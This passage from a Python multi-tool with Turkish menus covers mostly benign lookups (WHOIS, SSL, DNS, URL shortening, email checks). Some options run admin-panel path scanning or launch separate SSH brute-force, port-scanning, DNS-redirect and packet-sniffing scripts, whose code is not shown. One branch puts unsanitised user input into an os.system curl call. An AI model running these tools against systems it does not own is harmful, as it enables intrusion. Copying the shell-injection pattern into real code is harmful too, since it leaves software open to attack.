            bekleme_suresi = int(input("Her kontrol arasında bekleme süresi (saniye cinsinden) girin: "))
            print("İsterseniz hazır wordlisti de kullanabilirsiniz. Bunun için wordlist giriş kısmına admin_list.txt yazınız.")
            print("Buradaki hazır wordlisti https://github.com/alienwhatever/Admin-Scanner/blob/master/list.txt adresinden aldım.")
            list_dosyasi = input("Wordlist dosyası giriniz: ")
            listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi)
    
    
    
        elif(yeraltisecim=="26"):
            print("""Hangi servis üzerinde işlem yapmak isterseniz o servise bağlı numarayı giriniz.
    Seçenekler:
    1 - Tinyurl
    2 - isgd""")
            linksecim = int(input("Seçiminiz (1-2): "))
            import requests
            if linksecim==2:
                uzun_url = input("Kısaltılacak URL adresini giriniz: ")
                response = requests.get(f"http://is.gd/create.php?format=simple&url={uzun_url}")
                print("Kısaltılmış URL adresi:")
                print(response.text)
    
            elif linksecim==1:
                api_url = 'http://tinyurl.com/api-create.php?url='
                uzun_url = input("Kısaltılacak url adresini giriniz:")
                response = requests.get(api_url+uzun_url)
                print("Kısaltılmış url adresi:")
                print(response.text)
    
            else:
                print("Yalnızca 1 ve 2 seçenekleri mevcuttur.")
    
    
        elif(yeraltisecim=="27"):
            import requests
            print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
            domain = input("WHOIS bilgilerini almak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://rdap.org/domain/{domain}")
            whois_info = response.json()
            print(f"{domain} için WHOIS bilgileri:")
            print(whois_info)
    
    
        elif(yeraltisecim=="28"):
            import requests
            print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
            domain = input("SSL analizini yapmak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://api.ssllabs.com/api/v3/analyze?host={domain}")
            ssl_info = response.json()
            print(f"{domain} için SSL/TLS bilgileri:")
            print(ssl_info)
    
        elif(yeraltisecim=="29"):
            import requests
            response = requests.get("https://randomuser.me/api/")
            user = response.json()
            print("Rastgele kullanıcı:")
            print(f"İsim: {user['results'][0]['name']['first']} {user['results'][0]['name']['last']}")
            print(f"E-posta: {user['results'][0]['email']}")
            print(f"Ülke: {user['results'][0]['location']['country']}")
    
        elif(yeraltisecim=="30"):
            import requests
            print("Bu program sizin için sahte gönderi başlığı oluşturur. Farklı dillerde sonuç alabilirsiniz.")
            response = requests.get("https://jsonplaceholder.typicode.com/posts")
            posts = response.json()
            gonderi_sayi = int(input("Kaç gönderi görmek istiyorsunuz:"))
            print("İlk",gonderi_sayi,"gönderi:")
            for post in posts[:gonderi_sayi]:
                print(f"ID: {post['id']}, Başlık: {post['title']}")
    
        elif(yeraltisecim=="31"):
            import requests
            domain = input("DNS bilgilerini almak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://dns.google/resolve?name={domain}")
            dns_info = response.json()
            print(f"{domain} için DNS bilgileri:")
            for answer in dns_info.get('Answer', []):
                print(answer)
    
        elif(yeraltisecim=="32"):
            import requests
            isbn = input("ISBN numarasını giriniz: ")
            response = requests.get(f"https://openlibrary.org/api/books?bibkeys=ISBN:{isbn}&format=json&jscmd=data")
            kitap = response.json()
            print(f"Kitap Bilgisi: {kitap}")
    
        elif(yeraltisecim=="33"):
            import requests
            print("Bu sistem 2 yönlü api testi yapmaktadır. 2 seçeneği de deneyebilirsiniz. Bir seçenek hata verirse diğer seçeneğe geçiniz.")
            mailltestsecim = input("1 veya 2 yazınız. Hata alırsanız diğer seçeneği deneyiniz:")
            email = input("Doğrulamak istediğiniz e-posta adresini giriniz: ")
            if mailltestsecim=="1":
                response = requests.get(f"https://api.eva.pingutil.com/email?email={email}")
                email_info = response.json()
                print(f"Geçerli mi?: {email_info['data']['deliverable']}")
            elif mailltestsecim=="2":
                print("Mail dinleniyor...")
                os.system(f"""curl "https://api.eva.pingutil.com/email?email={email}" | json_pp""")
            else:
                print("Yanlış tuşladınız")
    
        elif(yeraltisecim=="34"):
            import requests
            ip = input("Analiz etmek istediğiniz IP adresini girin: ")
            response = requests.get(f"https://api.greynoise.io/v3/community/{ip}")
            ip_data = response.json()
            if ip_data.get("noise") == "true":
                print(f"{ip} bir zararlı faaliyete sahip.")
            else:
                print(f"{ip} güvenli görünüyor.")
            
    
        elif(yeraltisecim=="35"):
            os.system("python3 kits/sshbrute.py")
    
        elif(yeraltisecim=="36"):
            os.system("python3 kits/port-scanner-ip.py")
    
        elif(yeraltisecim=="37"):
            os.system("python3 kits/anormal-dns-tespit.py")
    
        elif(yeraltisecim=="38"):
            os.system("python3 kits/dns-yonlendirici.py")
    
        elif(yeraltisecim=="39"):
            os.system("python3 kits/sniff.py")
    
        elif(yeraltisecim=="40"):
            os.system("python3 kits/sniff2.py")
    
    
    
        elif(yeraltisecim=="41"):
            os.system("python3 omnikittoolsv"+surum+".py")
        else:
            print("Hatalı seçim, doğru seçeneği girdiğinizden emin olunuz")
    
    
        ana_menuye_don()
    
    else:
        print(f"\n\033[91m{t('invalid')}\033[0m")
        input(f"{t('press_enter')}")
